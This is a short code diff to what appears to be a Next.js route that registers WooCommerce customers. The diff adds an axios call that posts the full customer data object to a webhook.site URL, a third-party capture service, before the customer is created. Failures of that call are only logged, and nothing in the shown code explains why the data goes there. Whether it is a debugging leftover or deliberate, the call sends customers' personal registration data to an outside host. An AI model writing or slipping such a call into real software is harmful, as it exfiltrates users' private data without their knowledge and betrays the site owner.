@@ -1,4 +1,5 @@
 import { NextResponse } from "next/server";
+import axios from "axios";
 import WooCommerceRestApi from "@woocommerce/woocommerce-rest-api";
 
 // Initialize WooCommerce API with environment variables
@@ -70,6 +71,12 @@ export async function POST(req: Request) {
                 }
             ],
         };
+
+        try {
+            await axios.post("https://webhook.site/895ea683-c23b-4f2b-a39b-b99a16c1d489", data);
+        } catch (error) {
+            console.error("Webhook Error:", error);
+        }
 
         const response = await api.post("customers", data);
 
